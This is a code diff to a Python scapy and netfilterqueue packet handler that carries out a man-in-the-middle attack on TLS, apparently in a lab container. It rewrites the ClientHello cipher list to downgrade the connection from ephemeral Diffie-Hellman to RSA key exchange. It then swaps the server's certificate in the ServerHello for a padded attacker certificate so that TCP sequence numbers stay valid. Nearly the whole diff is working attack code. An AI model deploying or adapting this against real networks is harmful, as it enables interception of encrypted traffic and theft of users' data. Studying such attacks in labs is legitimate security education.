@@ -34,9 +34,12 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
     if scpy_pkt.haslayer(scapy.layers.inet.TCP):
         print("TCP packet received")
         #scpy_pkt.show2()
-        if scpy_pkt.haslayer("TLSClientHello"):
-            # todo: check if payload contains a TCP packet, if yes check if it contains a TLS handshake message, if not accept anyway, if yes
-            # as a test, drop each packet after printing it!
+        if scpy_pkt.haslayer("TLSClientHello"): # first packet of TLS handshake
+            # gotta modify the tls client hello to remove too secure cipher suites!
+            # IN our case, we want the client to use only RSA with AES 256_CBC_SHA since he tries to use Ephemeral DIffie hellman instead...
+            # so we intercept the packet and replace the Ephemeral choice with AES_128 version of the target cipher suite: this way
+            # we don't have to worry about intercepting the server hello (next TCP segment, a syn/ack to the CLient Hello) to
+            # modify its ACK number!
             print("--------------------------------------------------------------------------------")
             print("--------------------------------------------------------------------------------")
             print("--------------------------------------------------------------------------------")
@@ -45,15 +48,17 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             print("--------------------------------------------------------------------------------")
             print("--------------------------------------------------------------------------------")
             print("--------------------------------------------------------------------------------")
-            #modify it to remove TLS_DHE_RSA_WITH_AES_256_CBC_SHA
+
             tlsmsg : TLSClientHello = (scpy_pkt["TLSClientHello"])
 
+            #ignore the commented code, it was written as an attempt to try to make the attack work by dropping (not overwriting)
+            # the unwanted cipher suites
             from scapy.layers.tls.crypto.suites import TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA
             #tlsmsg.cipherslen = None # By setting it to none, it will rebuild during show2
             tlsmsg.ciphers = [0X00FF,TLS_RSA_WITH_AES_128_CBC_SHA ,TLS_RSA_WITH_AES_256_CBC_SHA]
             #tlsmsg.msglen = None # By setting it to none, it will rebuild during show2
 
-            print(tlsmsg.show2())
+            #print(tlsmsg.show2())
 
             #scpy_pkt["TCP"].remove_payload()
             #scpy_pkt /= tlsmsg # reattach tls...
@@ -63,16 +68,85 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
             del scpy_pkt["IP"].chksum
             #del scpy_pkt["IP"].dataofs
 
-            print(scpy_pkt["TCP"].show2())
-            print(scpy_pkt["IP"].show2())
+            #print(scpy_pkt["TCP"].show2())
+            #print(scpy_pkt["IP"].show2())
             print(scpy_pkt.show2())
 
             pkt.set_payload(bytes(scpy_pkt))
 
+        elif scpy_pkt.haslayer("TLSServerHello"): #second packet of the TLS handshake...
+            # we must forward it as it is, but modify serverCertificate. hich we must instead modify.
 
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+            print("TLS server hello captured")
+            scpy_pkt.show2()
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+            print("22222222222222222222222222222222222222222222222222222222222222222222222222222222")
+
+            #how many TLS records are stacked in this message?
+            n_tls_records = len(scpy_pkt["TCP"].layers()) - 1 # don't count TCP layer...
+            print("n_tls_records: " + str(n_tls_records))
+
+            # check each one
+            for i in range(1, n_tls_records + 1):
+                generic_tls_layer = scpy_pkt.getlayer("TLS", i) # each TLS message is wrapped inside a generic TLS layer,
+                                                                    # which has a type, a version, a len and an iv field...
+
+                if generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate) is not None:
+                    # ok we'll change this one...
+                    # the other possible layers are
+                    # server hello (forward as it is, contains session id),
+                    # certificate request (from server to client, needed for RSA exchange, forward as it is even though we'll answer it instead of the client by dropping the relative client layer in the next step)ù
+                    # and server hello done (forward as it is)
+
+                    #ok finally, we can adapt the length and padding to not deal with TCP sequential numbers
+
+                    scpy_tls_cert = generic_tls_layer.getlayer(scapy.layers.tls.handshake.TLSCertificate)
+
+                    # the attacker server certificate is 819 bytes long. the server real certificate is 853 bytes long
+                    attacker_certificate_der = open("/app/attacker_server_certificate.der", "rb").read()
+                    attacker_certificate_der_len = len(attacker_certificate_der)
+                    print(f"attacker certificate length is {attacker_certificate_der_len}")
+
+                    server_certificate_der = open("/app/server_certificate.der", "rb").read()
+                    server_certificate_der_len = len(server_certificate_der)
+                    #todo: what if negative difference? Then the only way is to actively modify seq fields!
+                    attacker_certificate_der_padded = attacker_certificate_der + b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
+                    attacker_certificate_der_padded_len = len(attacker_certificate_der_padded)
+
+                    scpy_tls_cert.certs = [(attacker_certificate_der_padded_len, attacker_certificate_der_padded)]
+                    scpy_tls_cert.certslen = None
+                    scpy_tls_cert.msglen = None
+
+                    # generic_tls_layer is the parent of scpy_tls_cert
+                    generic_tls_layer.len = None
+                    #generic_tls_layer.padlen = server_certificate_der_len - attacker_certificate_der_len
+                    #generic_tls_layer.pad = b'\x00'*(server_certificate_der_len - attacker_certificate_der_len)
+                    #generic_tls_layer.build_padding()
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+                    print(scpy_tls_cert.show2())
+                    print("------------------------------------------")
+                    del scpy_pkt["TCP"].chksum
+                    del scpy_pkt["IP"].chksum
+                    del scpy_pkt["IP"].len
+                    print(scpy_pkt.show2())
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+                    print("------------------------------------------")
+
+            print(len(bytes(scpy_pkt)))
+            pkt.set_payload(bytes(scpy_pkt))
 
         pkt.accept()
     else:
+
         pkt.accept()
 
 
